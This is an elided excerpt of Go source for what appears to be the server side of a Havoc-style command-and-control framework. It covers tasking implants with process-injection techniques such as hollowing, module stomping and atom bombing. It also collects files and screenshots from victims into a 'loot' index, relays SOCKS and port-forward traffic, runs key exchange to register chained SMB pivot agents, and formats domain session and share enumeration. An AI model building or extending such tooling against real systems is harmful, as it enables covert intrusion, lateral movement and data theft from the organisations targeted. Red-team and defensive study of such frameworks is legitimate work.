...
func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, ClientID string, teamserver TeamServer) (*Job, error) {
	...
	case COMMAND_FS:
		...
		case "download":
			...
			// Check for aggressive flag if present
			if len(ArgArray) > 1 {
				if val, err := base64.StdEncoding.DecodeString(ArgArray[1]); err == nil {
					Aggressive = string(val) == "true"
				}
			}
		...
		if val, ok := Optional["Way"]; ok {
			...
			if val.(string) == "Inject" {
				...
				case "ntcreatethreadex":
					Technique = THREAD_METHOD_NTCREATETHREADEX
					break
			...
			/* Thread execution methods */
				case "callback":
					Technique = INJECTION_TECHNIQUE_CALLBACK
					break

				case "fiber":
					Technique = INJECTION_TECHNIQUE_FIBER
					break

				case "exception":
					Technique = INJECTION_TECHNIQUE_EXCEPTION
					break

				case "workitem":
					Technique = INJECTION_TECHNIQUE_WORKITEM
					break

				/* Threadless injection techniques */
				case "window":
					Technique = INJECTION_TECHNIQUE_WINDOW_PROC
					break

				case "vectored":
					Technique = INJECTION_TECHNIQUE_VECTORED_EH
					break

				case "atombomb":
					Technique = INJECTION_TECHNIQUE_ATOM_BOMB
					break

				/* Legacy injection techniques (kept for compatibility) */
				case "stomp":
					Technique = INJECTION_TECHNIQUE_MODULE_STOMP
					break

				case "hollow":
					Technique = INJECTION_TECHNIQUE_PROCESS_HOLLOW
					break

				case "hijack":
					Technique = INJECTION_TECHNIQUE_THREAD_HIJACK
					break

				case "manual":
					Technique = INJECTION_TECHNIQUE_MANUAL_MAP
					break

				default:
					return job, fmt.Errorf("technique \"%v\" not supported.\nThreadless: window, vectored, atombomb\nThread-based: callback, fiber, exception, workitem, manual\nDefault: window", Optional["Technique"].(string))
				}
...
func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.Parser, teamserver TeamServer) {
					...
					if !Success {
						...
						for Parser.CanIRead(WhatToRead) {
							...
							for ItemsLeft > 0 && ((ListOnly && Parser.CanIRead([]parser.ReadType{parser.ReadBytes})) || (!ListOnly && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBool, parser.ReadInt64, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}))) {
								...
								var (
									FileNameRaw           = Parser.ParseUTF16String()
									IsDir                 = false
									FileSize        int64 = 0
									LastAccessDay         = 0
									LastAccessMonth       = 0
								...
								// Sanitize FileName to prevent XSS and maintain visual fidelity
				...
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					...
					case 0x0:
						...
						if Parser.CanIRead([]parser.ReadType{parser.ReadInt64, parser.ReadBytes}) {
							...
							// Check if current download request was initiated with aggressive flag
							// by examining the request that started this download
							var isAggressive = false
							for _, task := range a.Tasks {
								if task.RequestID == RequestID && len(task.Data) >= 3 {
									if aggressive, ok := task.Data[2].(bool); ok {
							...
							if err := a.DownloadAdd(FileID, FileName, FileSize, isAggressive); err != nil {
								Output["Type"] = "Error"
						...
						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
							...
							if len(a.Downloads) > 0 {
								...
								if Reason == 0x0 {
									...
									// Get download info before closing
									var download = a.DownloadGet(FileID)
									if download != nil {
										// Get file bytes from the completed download file
										fileInfo, err := os.Stat(download.LocalFile)
										if err == nil {
											// Use the operator who initiated the command
											operator := "unknown"
											if a.CurrentOperator != "" {
												operator = a.CurrentOperator
											}

											// Get just the filename for the loot system
											fileSplit := strings.Split(FileName, "\\")
											justFileName := fileSplit[len(fileSplit)-1]

											// Add metadata with full agent context to master loot index
											metadata := logr.LootMetadata{
												Type:         "download",
												Filename:     justFileName,
												RelativePath: "Download/" + strings.ReplaceAll(FileName, "\\", "/"),
												FullPath:     download.LocalFile,
												Operator:     operator,
												Timestamp:    time.Now().Format("02/01/2006 15:04:05"),
												Size:         fileInfo.Size(),
												ExternalIP:   a.Info.ExternalIP,
											...
											// Add to master loot index
											if err := logr.LogrInstance.AddToMasterLootIndex(metadata); err != nil {
												logger.Error("Failed to add enhanced loot metadata for download: " + err.Error())
											} else {
												logger.Info("Successfully added enhanced metadata for download: " + justFileName)
											}
										}
									}
		...
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			...
			case CALLBACK_OUTPUT:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					...
					outputStr := Parser.ParseString()

					// **FIX**: Check if there's a BOF callback first
					found := false
					for _, BofCallback := range a.BofCallbacks {
						if BofCallback.TaskID == RequestID {
							// Store in callback - don't display to console
							BofCallback.Output += outputStr
							found = true
							break
						}
					}

					// Only display to console if NO BOF callback exists
					if !found {
						var Output = make(map[string]string)
						Output["Type"] = "Good"
			...
			case CALLBACK_OUTPUT_OEM:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					...
					outputStr := Parser.ParseUTF16String()
			...
			case CALLBACK_FILE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					...
					if len(Data) > 8 {
						...
						if err := a.DownloadAdd(FileID, FileName, FileLength, false); err != nil {
							Output["Type"] = "Error"
							Output["Message"] = err.Error()
						} else {
							Output["MiscType"] = "download"
	...
	case COMMAND_INLINEEXECUTE:
		...
		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			...
			// Route through BofCallbacks if one exists for this RequestID.
			// This is an intermediate status -- COULD_NO_RUN follows and handles
			// final cleanup + RequestCompleted. Do NOT call RequestCompleted here.
			found := false
			for i := range a.BofCallbacks {
				if a.BofCallbacks[i].TaskID == RequestID {
					a.BofCallbacks[i].Error += "Symbol not found: " + LibAndFunc + "\n"
					found = true
					break
				}
			}
			...
			if !found {
				// No callback registered -- send directly to console
				OutputMap["Type"] = "Error"
	...
	case COMMAND_SOCKET:
		...
		// **SECURITY FIX**: Validate socket operations against legitimate tasks and active connections
		if !a.validateSocketOperation(RequestID, teamserver) {
			logger.Error(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SECURITY VIOLATION: Unauthorized socket operation from RequestID %d", AgentID, RequestID))
			Message = map[string]string{
				"Type":    "Error",
				"Message": "Unauthorized socket operation blocked",
			}
			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
			return
		}
		...
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			...
			case SOCKET_COMMAND_OPEN:
				...
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					...
					// **SECURITY VALIDATION**: SOCKET_COMMAND_OPEN should only be allowed for legitimate rportfwd operations
					// Verify this is not an arbitrary connection attempt
					if !a.isValidPortForwardTarget(LclAddr, LclPort, FwdAddr, FwdPort) {
						logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: Unauthorized SOCKET_COMMAND_OPEN attempt to %s:%d", AgentID, common.Int32ToIpString(int64(FwdAddr)), FwdPort))
						Message = map[string]string{
							"Type":    "Error",
							"Message": "Unauthorized socket connection blocked",
						}
						teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
						return
					}
			...
			case SOCKET_COMMAND_READ:
				...
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					...
					// **SECURITY VALIDATION**: SOCKET_COMMAND_READ should only be allowed for existing socket connections
					if Type == SOCKET_TYPE_CLIENT {
						if a.PortFwdGet(SocktID) == nil {
							logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: SOCKET_COMMAND_READ for non-existent rportfwd socket %x", AgentID, SocktID))
							Message = map[string]string{
								"Type":    "Error",
								"Message": "Unauthorized socket read blocked",
							}
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
							return
						}
					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
						if a.SocksClientGet(SocktID) == nil {
							logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: SOCKET_COMMAND_READ for non-existent socks socket %x", AgentID, SocktID))
							Message = map[string]string{
								"Type":    "Error",
								"Message": "Unauthorized socket read blocked",
							}
			...
			case SOCKET_COMMAND_WRITE:
				...
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					...
					// **SECURITY VALIDATION**: SOCKET_COMMAND_WRITE should only be allowed for existing socket connections
					if Type == SOCKET_TYPE_CLIENT {
						if a.PortFwdGet(Id) == nil {
							logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: SOCKET_COMMAND_WRITE for non-existent rportfwd socket %x", AgentID, Id))
							Message = map[string]string{
								"Type":    "Error",
								"Message": "Unauthorized socket write blocked",
							}
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
							return
						}
					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
						if a.SocksClientGet(Id) == nil {
							logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: SOCKET_COMMAND_WRITE for non-existent socks socket %x", AgentID, Id))
							Message = map[string]string{
								"Type":    "Error",
								"Message": "Unauthorized socket write blocked",
							}
			...
			case SOCKET_COMMAND_CLOSE:
				...
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					...
					// **SECURITY VALIDATION**: SOCKET_COMMAND_CLOSE should only be allowed for existing socket connections
					if Type == SOCKET_TYPE_REVERSE_PROXY {
						if a.SocksClientGet(SockId) == nil {
							logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: SOCKET_COMMAND_CLOSE for non-existent socks socket %x", AgentID, SockId))
							Message = map[string]string{
								"Type":    "Error",
								"Message": "Unauthorized socket close blocked",
							}
							teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
							return
						}
			...
			case SOCKET_COMMAND_CONNECT:
				...
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					...
					// **SECURITY VALIDATION**: SOCKET_COMMAND_CONNECT should only be allowed for existing socks connections
					if Client := a.SocksClientGet(SocketId); Client != nil {
						...
						logger.Error(fmt.Sprintf("Agent: %x, SECURITY VIOLATION: SOCKET_COMMAND_CONNECT for non-existent socks socket %x", AgentID, SocketId))
						Message = map[string]string{
							"Type":    "Error",
							"Message": "Unauthorized socket connect blocked",
						}
						teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
						return
					}
			...
			if Success == 1 {
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					...
					if len(BmpBytes) > 0 {
						...
						err := logr.LogrInstance.DemonSaveScreenshotWithOperatorAndContext(a.NameID, Name, operator, BmpBytes, a.Info.ExternalIP, a.Info.Hostname, a.Info.Username)
						if err != nil {
							Message["Type"] = "Error"
						...
						// Create enhanced metadata JSON for client
						enhancedMetadata := map[string]string{
							"filename":    Name,
							"operator":    operator,
							"external_ip": a.Info.ExternalIP,
							"hostname":    a.Info.Hostname,
							"username":    a.Info.Username,
							"session_id":  a.NameID,
						}
						metadataJSON, _ := json.Marshal(enhancedMetadata)
						Message["MiscData2"] = string(metadataJSON)
					} else {
						Message["Type"] = "Error"
	...
	case COMMAND_PIVOT:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			...
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT, PivotCommand: %d", AgentID, PivotCommand))
			...
			case DEMON_PIVOT_LIST:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					...
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_LIST, Count: %d", AgentID, PivotCount))

					Message["Type"] = "Good"
					Message["Message"] = fmt.Sprintf("Listed %d pivot connections", PivotCount)

					// TODO: Parse and display individual pivot data if needed
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_LIST, Invalid packet", AgentID))
					Message["Type"] = "Error"
					Message["Message"] = "Failed to parse pivot list response"
				}
				break
		...
		case DEMON_PIVOT_SMB_CONNECT:
			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
				...
				if Success == 1 {
					Message["Type"] = "Good"
					Message["Message"] = "Successfully connected to SMB pivot"

					// The parent's PivotAdd reads the child's first KEX hello from the pipe
					// and embeds it in the CONNECT response. Process it here instead of
					// waiting for PivotPush (which would arrive too late — the child retries
					// KEX with new keys before PivotPush delivers the hello).
					if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
						kexPackage := Parser.ParseBytes()
						if len(kexPackage) > 0 {
							logger.Debug(fmt.Sprintf("Agent: %x, CONNECT response contains %d bytes of KEX data, processing inline", AgentID, len(kexPackage)))

							// Parse the embedded KEX package (same format as DEMON_PIVOT_SMB_COMMAND)
							AgentHdr, err := ParseHeader(kexPackage)
							if err == nil && IsValidDemonMagic(uint32(AgentHdr.MagicValue)) {
								kexLen := KexPubLen + KexNonceLen + KexMacLen
								if AgentHdr.Data.Length() >= kexLen {
									// This is a new SMB agent KEX hello — process it
									logger.Debug(fmt.Sprintf("Agent: %x, Inline KEX hello for pivot %x (%d bytes)", AgentID, AgentHdr.AgentID, AgentHdr.Data.Length()))

									smbPSKs := teamserver.GetSMBListenerPSKs()
									if len(a.Encryption.PSK) >= KexKeyLen {
										smbPSKs = append(smbPSKs, a.Encryption.PSK)
									}

									var hello AgentHello
									buf := AgentHdr.Data.ParseAtLeastBytes(kexLen)
									if len(buf) >= kexLen {
										copy(hello.Ea[:], buf[0:KexPubLen])
										copy(hello.NonceA[:], buf[KexPubLen:KexPubLen+KexNonceLen])
										copy(hello.MacA[:], buf[KexPubLen+KexNonceLen:KexPubLen+KexNonceLen+KexMacLen])
										...
										for _, tryPSK := range smbPSKs {
											sh, dk, kexErr = ServerProcessAgentHello(tryPSK, hello)
											if kexErr == nil {
												workingPSK = tryPSK
												break
											}
										...
										if workingPSK != nil {
											// Create pivot agent and route ServerHello back
											PivotAgent := &Agent{
												Active: false,
												Info:   new(AgentInfo),
												Encryption: struct {
													...
													PSK:    append([]byte{}, workingPSK...),
												},
												MagicValue: uint32(AgentHdr.MagicValue),
											}
											PivotAgent.NameID = fmt.Sprintf("%08x", AgentHdr.AgentID)
											PivotAgent.Pivots.Parent = a
											teamserver.AgentAdd(PivotAgent)

											// Build and route ServerHello
											serverHelloRaw := make([]byte, 0, KexPubLen+KexNonceLen+KexMacLen)
											serverHelloRaw = append(serverHelloRaw, sh.Es[:]...)
											serverHelloRaw = append(serverHelloRaw, sh.NonceS[:]...)
											serverHelloRaw = append(serverHelloRaw, sh.MacS[:]...)

											frame := make([]byte, 4+4+len(serverHelloRaw))
											binary.LittleEndian.PutUint32(frame[0:4], uint32(AgentHdr.AgentID))
											binary.LittleEndian.PutUint32(frame[4:8], uint32(len(serverHelloRaw)))
											copy(frame[8:], serverHelloRaw)

											PivotAddRawFrame(PivotAgent, frame)

											Message["Message"] = fmt.Sprintf("[SMB] KEX completed for new pivot agent %08x", AgentHdr.AgentID)
											logger.Debug(fmt.Sprintf("[SMB PIVOT] Inline KEX from CONNECT: agent %08x, ServerHello routed", AgentHdr.AgentID))
										} else {
											logger.Debug(fmt.Sprintf("[SMB PIVOT] Inline KEX failed: no matching PSK for agent %x", AgentHdr.AgentID))
										}
									}
								}
							}
					...
					if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
						var ErrorCode = Parser.ParseInt32()
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to connect to SMB pivot (Error: %d)", ErrorCode)
					} else {
						Message["Type"] = "Error"
						Message["Message"] = "Failed to connect to SMB pivot"
					}
				}
			} else {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
				Message["Type"] = "Error"
				Message["Message"] = "Failed to parse SMB pivot connect response"
			}
			break
			...
			case DEMON_PIVOT_SMB_DISCONNECT:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Success              = Parser.ParseInt32()
						AgentID_Disconnected = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_DISCONNECT, Success: %d, DisconnectedAgentID: %x", AgentID, Success, AgentID_Disconnected))

					if Success == 1 {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Successfully disconnected SMB pivot agent %x", AgentID_Disconnected)

						// TODO: Remove the disconnected agent from teamserver if needed
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("Failed to disconnect SMB pivot agent %x", AgentID_Disconnected)
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_DISCONNECT, Invalid packet", AgentID))
					Message["Type"] = "Error"
					Message["Message"] = "Failed to parse SMB pivot disconnect response"
				}
				break
		...
		case DEMON_PIVOT_SMB_COMMAND:
			...
			if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
				...
				if err == nil {
					// Validate magic value first
					if !IsValidDemonMagic(uint32(AgentHdr.MagicValue)) {
						Message["Type"] = "Error"
					...
					// Get the pivot agent
					var PivotAgent *Agent = teamserver.AgentInstance(AgentHdr.AgentID)

					if PivotAgent == nil {
						// NEW SMB AGENT - Check if this is KEX hello (80 bytes = 32 pub + 16 nonce + 32 mac)
						kexLen := KexPubLen + KexNonceLen + KexMacLen
						if AgentHdr.Data.Length() >= kexLen {
							logger.Debug(fmt.Sprintf("Agent: %x, PIVOT SMB KEX hello received (%d bytes)", AgentHdr.AgentID, AgentHdr.Data.Length()))

							// Try all SMB listener PSKs to find one that verifies the KEX MAC.
							// This handles the case where SMB listener has different PSK than parent.
							smbPSKs := teamserver.GetSMBListenerPSKs()
							
							// Also try parent's PSK as fallback
							if len(a.Encryption.PSK) >= KexKeyLen {
								smbPSKs = append(smbPSKs, a.Encryption.PSK)
							}
							...
							if len(smbPSKs) == 0 {
								Message["Type"] = "Error"
								Message["Message"] = "[SMB] No PSKs available for pivot KEX"
								break
							}
							logger.Debug(fmt.Sprintf("[SMB PIVOT KEX] Trying %d PSKs for agent %x", len(smbPSKs), AgentHdr.AgentID))
							...
							for _, tryPSK := range smbPSKs {
								...
								logger.Debug(fmt.Sprintf("[SMB PIVOT KEX] PSK failed: %v", kexErr))
							}
							
							if workingPSK == nil {
								logger.Debug(fmt.Sprintf("[SMB PIVOT KEX] All %d PSKs failed", len(smbPSKs)))
								Message["Type"] = "Error"
								Message["Message"] = "[SMB] KEX failed: no matching PSK found"
								break
							}
							
							// Debug: log derived keys
							logger.Debug(fmt.Sprintf("[SMB PIVOT KEX] Derived keys - AESMac first8=%x", dk.AESMac[:8]))

							// Create inactive agent placeholder for SMB pivot
							PivotAgent = &Agent{
								Active: false,
								Info:   new(AgentInfo),
								Encryption: struct {
							...
							PivotAgent.NameID = fmt.Sprintf("%08x", AgentHdr.AgentID)
							// Note: Listener info will be populated during registration

							// Link pivot to parent
							PivotAgent.Pivots.Parent = a

							// Add to teamserver (inactive until metadata arrives)
							teamserver.AgentAdd(PivotAgent)
							logger.Debug(fmt.Sprintf("[SMB PIVOT KEX] Agent %s added (inactive), linked to parent %s", PivotAgent.NameID, a.NameID))

							// Queue ServerHello to be sent back through parent
							// Wire format expected by SmbRecv: [AgentID:4 LE][PayloadLen:4 LE][Payload]
							serverHelloRaw := make([]byte, 0, KexPubLen+KexNonceLen+KexMacLen)
							serverHelloRaw = append(serverHelloRaw, sh.Es[:]...)
							serverHelloRaw = append(serverHelloRaw, sh.NonceS[:]...)
							serverHelloRaw = append(serverHelloRaw, sh.MacS[:]...)
							
							// Build framed packet for SMB child: [AgentID:4 LE][Len:4 LE][ServerHello]
							// Note: This is the data written to the pipe, child reads as raw LE
							frame := make([]byte, 4+4+len(serverHelloRaw))
							binary.LittleEndian.PutUint32(frame[0:4], uint32(AgentHdr.AgentID))
							binary.LittleEndian.PutUint32(frame[4:8], uint32(len(serverHelloRaw)))
							copy(frame[8:], serverHelloRaw)

							// Route ServerHello through the parent chain using PivotAddRawFrame.
							// This handles multi-hop: for A→B→C, it wraps the frame at each
							// intermediate hop with encryption, but leaves the innermost
							// ServerHello payload unencrypted (child has no keys yet).
							PivotAddRawFrame(PivotAgent, frame)
							logger.Debug(fmt.Sprintf("[SMB PIVOT KEX] ServerHello routed through chain for pivot %x (%d bytes)", AgentHdr.AgentID, len(frame)))

							Message["Type"] = "Good"
							Message["Message"] = fmt.Sprintf("[SMB] KEX completed for new pivot agent %08x", AgentHdr.AgentID)
						} else {
							Message["Type"] = "Error"
							Message["Message"] = fmt.Sprintf("[SMB] Unknown agent %x and packet too small for KEX (%d bytes)", AgentHdr.AgentID, AgentHdr.Data.Length())
						}
					} else if !PivotAgent.Active {
						// INACTIVE AGENT - This should be registration metadata following KEX
						// BUT the child might be re-sending KEX hello if it didn't receive ServerHello
						kexLen := KexPubLen + KexNonceLen + KexMacLen // 80 bytes
						originalDataLen := AgentHdr.Data.Length()
						
						logger.Debug(fmt.Sprintf("Agent: %x, PIVOT SMB inactive agent packet, data len=%d", AgentHdr.AgentID, originalDataLen))
						
						// Debug: check if we have valid keys
						if len(PivotAgent.Encryption.AESMac) < 32 {
							logger.Debug(fmt.Sprintf("[SMB PIVOT] WARNING: AESMac len=%d (should be 32)", len(PivotAgent.Encryption.AESMac)))
						} else {
							logger.Debug(fmt.Sprintf("[SMB PIVOT] AESMac first8=%x", PivotAgent.Encryption.AESMac[:8]))
						}

						// Verify MAC
						if !AgentHdr.Data.TrimMACAndVerify(PivotAgent.Encryption.AESMac) {
							logger.Debug(fmt.Sprintf("[SMB PIVOT] MAC verify failed for Agent %x (dataLen=%d)", AgentHdr.AgentID, originalDataLen))
							
							// Check if this is a KEX hello retry (child didn't receive ServerHello)
							// KEX hello is exactly 80 bytes: [32 Ea][16 NonceA][32 MacA]
							// BUT registration data can also be 80 bytes (4+4+40+32).
							// Disambiguate by actually verifying the AgentHello MAC before treating as re-KEX.
							if originalDataLen >= kexLen {
								logger.Debug(fmt.Sprintf("[SMB PIVOT] Agent %x: MAC failed, checking if packet is KEX hello (size=%d)", AgentHdr.AgentID, originalDataLen))
								
								// Reset parser and extract KEX hello
								kexData := Package[:kexLen+12] // Include the header (Size+Magic+AgentID = 12 bytes)
								var kexHdr Header
								var kexErr error
								kexHdr, kexErr = ParseHeader(kexData)
								if kexErr == nil && kexHdr.Data.Length() >= kexLen {
									var hello AgentHello
									buf := kexHdr.Data.ParseAtLeastBytes(kexLen)
									if len(buf) >= kexLen {
										copy(hello.Ea[:], buf[0:KexPubLen])
										copy(hello.NonceA[:], buf[KexPubLen:KexPubLen+KexNonceLen])
										copy(hello.MacA[:], buf[KexPubLen+KexNonceLen:KexPubLen+KexNonceLen+KexMacLen])
										
										// Try with existing agent's PSK first
										sh, dk, errK := ServerProcessAgentHello(PivotAgent.Encryption.PSK, hello)
										if errK != nil {
											// Try other SMB PSKs
											reKexPSKs := teamserver.GetSMBListenerPSKs()
											if len(a.Encryption.PSK) >= KexKeyLen {
												reKexPSKs = append(reKexPSKs, a.Encryption.PSK)
											}
											for _, tryPSK := range reKexPSKs {
												sh, dk, errK = ServerProcessAgentHello(tryPSK, hello)
												if errK == nil {
													PivotAgent.Encryption.PSK = append([]byte{}, tryPSK...)
													break
												}
											}
										}
										...
										if errK == nil {
											// Update agent's session keys
											PivotAgent.Encryption.AESKey = append([]byte{}, dk.AESKey[:]...)
											PivotAgent.Encryption.AESIv = append([]byte{}, dk.AESIv[:]...)
											PivotAgent.Encryption.AESMac = append([]byte{}, dk.AESMac[:]...)
											
											logger.Debug(fmt.Sprintf("[SMB PIVOT] Agent %x: Re-KEX successful, new AESMac first8=%x", AgentHdr.AgentID, PivotAgent.Encryption.AESMac[:8]))
											
											// Note: Don't call AgentUpdate here - the agent is only in memory
											// (inactive agents aren't persisted to DB until registration completes)
											
											// Queue ServerHello response to parent
											serverHelloRaw := make([]byte, 0, KexPubLen+KexNonceLen+KexMacLen)
											serverHelloRaw = append(serverHelloRaw, sh.Es[:]...)
											serverHelloRaw = append(serverHelloRaw, sh.NonceS[:]...)
											serverHelloRaw = append(serverHelloRaw, sh.MacS[:]...)
											...
											// Route re-KEX ServerHello through the parent chain
											PivotAddRawFrame(PivotAgent, frame)
											
											Message["Type"] = "Good"
											Message["Message"] = fmt.Sprintf("[SMB] Re-KEX completed for pivot %08x", AgentHdr.AgentID)
											break
										} else {
											logger.Debug(fmt.Sprintf("[SMB PIVOT] Re-KEX failed: %v", errK))
										}
									}
								}
							}
							...
							Message["Type"] = "Error"
							Message["Message"] = "[SMB] MAC verification failed for registration"
							break
						}
						...
						if AgentHdr.Data.Length() >= 8 {
							_ = AgentHdr.Data.ParseInt32() // CommandID
							_ = AgentHdr.Data.ParseInt32() // RequestID
						}

						// Parse registration
						externalIP := a.Info.ExternalIP // Use parent's external IP
						RegAgent := ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data, externalIP)
						if RegAgent == nil {
							Message["Type"] = "Error"
							Message["Message"] = "[SMB] Failed to parse pivot registration"
							break
						}

						// Copy registration info into existing agent
						PivotAgent.Info = RegAgent.Info
						PivotAgent.Active = true
						PivotAgent.MagicValue = uint32(AgentHdr.MagicValue)

						// Add to parent's pivot links
						a.Pivots.Links = append(a.Pivots.Links, PivotAgent)

						// Now that agent is active with full info, add to DB and update
						// (AgentAdd skips inactive agents, so we need to add now)
						teamserver.AgentAdd(PivotAgent)
						teamserver.AgentUpdate(PivotAgent)
						logger.Info(fmt.Sprintf("New SMB Pivot agent registered: %s", PivotAgent.NameID))

						pk := teamserver.EventNewDemon(PivotAgent)
						teamserver.EventAppend(pk)
						teamserver.EventBroadcast("", pk)
						teamserver.AgentSendNotify(PivotAgent)

						logger.Debug(fmt.Sprintf("[SMB PIVOT] Agent %s now active, linked to parent %s", PivotAgent.NameID, a.NameID))
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("[SMB] Pivot agent %s registered successfully", PivotAgent.NameID)

					} else {
						// ACTIVE AGENT - Normal command/response processing
						PivotAgent.UpdateLastCallback(teamserver)
						logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Linked Agent: %s", AgentID, PivotAgent.NameID))

						// Verify MAC
						if !AgentHdr.Data.TrimMACAndVerify(PivotAgent.Encryption.AESMac) {
							logger.Debug(fmt.Sprintf("[SMB PIVOT] MAC verify failed for Agent %x", AgentHdr.AgentID))
							Message["Type"] = "Error"
							Message["Message"] = "[SMB] MAC verification failed"
							break
						}

						// Decrypt FIRST — CommandID and RequestID are now encrypted (padding=12)
						if AgentHdr.Data.Length() > 0 {
							AgentHdr.Data.DecryptBuffer(PivotAgent.Encryption.AESKey, PivotAgent.Encryption.AESIv)
						}

						// Parse outer command from decrypted data, then inner packages
				...
				Message["Type"] = "Error"
				Message["Message"] = "Failed to parse SMB pivot command response"
			}
			...
			default:
				...
				Message["Type"] = "Error"
				Message["Message"] = fmt.Sprintf("Unknown pivot command: %d", PivotCommand)
			}
	...
	case COMMAND_NET:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			...
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET, SubCommand: %d", AgentID, NetCommand))

			switch NetCommand {
			case DEMON_NET_COMMAND_DOMAIN:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					Domain := common.StripNull(string(Parser.ParseBytes()))
					Output = fmt.Sprintf("Domain: %s", Domain)
				}

			case DEMON_NET_COMMAND_LOGONS:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					ServerName := Parser.ParseUTF16String()
					Output = fmt.Sprintf("Logged on users at %s:\n\n", ServerName)
			...
			case DEMON_NET_COMMAND_SESSIONS:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					ServerName := Parser.ParseUTF16String()
					Output = fmt.Sprintf("Sessions at %s:\n\n", ServerName)
					Output += fmt.Sprintf(" %-30s %-30s %-15s %-15s\n", "Computer", "Username", "Time", "Idle Time")
					Output += fmt.Sprintf(" %-30s %-30s %-15s %-15s\n", strings.Repeat("-", 30), strings.Repeat("-", 30), strings.Repeat("-", 15), strings.Repeat("-", 15))
					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
						Computer := Parser.ParseUTF16String()
						Username := Parser.ParseUTF16String()
						Time := Parser.ParseInt32()
						IdleTime := Parser.ParseInt32()
						Output += fmt.Sprintf(" %-30s %-30s %-15d %-15d\n", Computer, Username, Time, IdleTime)
					}
				}
			...
			case DEMON_NET_COMMAND_SHARE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					ServerName := Parser.ParseUTF16String()
					Output = fmt.Sprintf("Shares at %s:\n\n", ServerName)
					Output += fmt.Sprintf(" %-20s %-40s %-30s %-12s\n", "Share Name", "Path", "Remark", "Permissions")
					Output += fmt.Sprintf(" %-20s %-40s %-30s %-12s\n", strings.Repeat("-", 20), strings.Repeat("-", 40), strings.Repeat("-", 30), strings.Repeat("-", 12))
					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32}) {
						NetName := Parser.ParseUTF16String()
						Path := Parser.ParseUTF16String()
						Remark := Parser.ParseUTF16String()
						Perms := Parser.ParseInt32()
						Output += fmt.Sprintf(" %-20s %-40s %-30s %-12d\n", NetName, Path, Remark, Perms)
					}
				}
			...
